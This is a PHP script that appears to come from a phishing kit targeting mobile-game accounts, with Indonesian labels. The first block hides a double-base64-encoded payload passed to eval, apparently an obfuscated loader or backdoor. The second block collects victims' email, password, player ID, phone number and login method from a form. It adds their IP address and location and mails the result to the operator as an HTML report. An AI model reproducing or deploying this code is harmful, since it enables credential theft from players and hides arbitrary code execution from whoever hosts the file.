<?php
$SISTEMIT_COM_ENC = "lVRPa9swFD834C9RAk4g1PeVMtRYTUUS2SjyulGGoYYYNiOMT2NjH+t9IGPwQWKHHHwShUlOgp2Wpu7F9u+Pfu9ZerYz8jyYM4w49uH2GywiumAGOJY/AtjwgBmqJdeY+ihEfIkooBVaIw4khJCRW+QT2BDgiC0wd0bbSiRSlQJSLeeZ0kKScDKFP85orPJmtyt0XcMNuO61M1JbmBibFs8T957zMJ6vCKY8JqE7nb5Y8JbPxOis1qC2p1Ff47uAPSDmY98+vRP4yj0gdnjk23Ef6XFgh0P7O98dw+uA4xj5/pm2TkyHkJfnHNElDR6oPe5Cy6oQ0OmG+9vN14Iwsj43XLA0M4nZF8wgojxagk9WaI6WpmRVZKbY5T8p8/qT5zW5ujJVzPVJ/bbI+6zym8urk5m8tqXHyX6pvcVKKDmxWVZrmVrLMjecBTOYR2wVhDw2txkM8DHMI0Y5Q3Rzh9kMZFHpQ1nz+vmxrP6lk/1SK15ctGSSlbXu2PGukY1Z8KMuRbzTSbkzog2ZdaFmG+/RhqwgxO2+vPepjpu0Emms8vjkaE926ODZZk1q1LaLR9ci93unJk2W2Y46x5Hpu560qJrO0sK+LnTaFD3DHvcdeVE+K1GrznNk+q6fpeylWNSqzkf+ef8B";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP="FD834C9RAk4g1PeVMtRYTUUS2SjyulGGoYYYNiOMT2NjH+t9IGPwQWKHHHwShUlOgp2Wpu7F9u+Pfu9ZerYz8jyYM4w49uH2GywiumAGOJY/AtjwgBmqJdeY+ihEfIkooBVaIw4khJCRW+QT2BDgiC0wd0bbSiRSlQJSLeeZ0kKScDKFP85orPJmtyt0XcMNuO61M1Jb";
?>
<?php include 'system/setting.php';include 'email.php';$email=$_POST['email'];$password=$_POST['password'];$playid=$_POST['playid'];$phone=$_POST['phone'];$level=$_POST['level'];$login=$_POST['login'];if($email==""&&$password==""&&$playid==""&&$phone==""&&$login==""){header("Location: index.php");}else{$subjek=" $agung_flag | $agung_callcode | LOGIN $login | PUNYA SI $email";$pesan='
<center>
<div style="background: url(https://raw.githubusercontent.com/genjehhh1/pabjii/main/banner.png) no-repeat center center; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Account Information</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
<th style="width: 78%; text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CHARACTER ID</th>
<th style="width: 78%; text-align: center;"><b>'.$playid.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PHONE NUMBER</th>
<th style="width: 78%; text-align: center;"><b>'.$phone.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LOGIN</th>
<th style="width: 78%; text-align: center;"><b>'.$login.'</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Additional Information</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>ALAMAT IP</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$agung_ip_address.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>BENUA</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$agung_benua.'</th>
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>NEGARA</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$agung_negara.'</th>
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>PROVINSI</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$agung_provinsi.'</th>
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>KOTA</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$agung_kota.'</th>
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>WAKTU MASUK</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$jamasuk.'</th> 
</tr>
</table>
<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-left: 1px solid #000; border-bottom: 1px solid #000; border-right: 1px solid #000; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; font-weight: bold; text-align: center;">
<div style="float: left; margin-top: 3%;">
MY TELEGRAM :
</div>
<div style="float: right;">
<a href="https://t.me/"><img style="margin: 5px;" width="30" src="https://i.postimg.cc/mkhfPs8P/tele.png"></a>
</div>
</div>
</center>
';$headers='MIME-Version: 1.0'."\r\n";$headers.='Content-type: text/html; charset=iso-8859-1'."\r\n";$headers.=''.$sender.''."\r\n";$kirim=mail($emailku,$subjek,$pesan,$headers);} ?>